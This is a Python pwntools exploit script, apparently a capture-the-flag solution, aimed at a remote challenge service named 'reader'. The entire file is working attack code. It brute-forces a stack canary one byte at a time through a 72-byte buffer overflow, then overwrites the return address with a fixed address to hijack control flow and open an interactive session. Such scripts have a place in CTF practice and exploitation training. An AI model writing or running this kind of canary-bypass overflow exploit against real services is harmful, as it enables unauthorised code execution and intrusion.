#!/usr/bin/python3.8
from pwn import *
from Crypto.Util.number import long_to_bytes

r = remote('0.cloud.chals.io', 10677)
#r = process("./reader")
canary = b'\x00'
byte = [ long_to_bytes(x) for x in range(1, 0x100) ]

r.recvuntil(b"Enter some data: ")

while len(canary) != 8:
    for b in byte:
        candidate = canary + b
        #print(f"trying: {candidate = }")
        payload = b'A'*72 + candidate
        r.send(payload)
        rst = r.recvuntil(b'Enter some data: ').decode()
        if rst.find('***') == -1:        # no stack smashing
            canary = candidate
            print(f'current {canary = }')
            break

payload = b'A'*72 + canary + b'B'*8 + p64(0x40127B)
r.send(payload)
r.interactive()
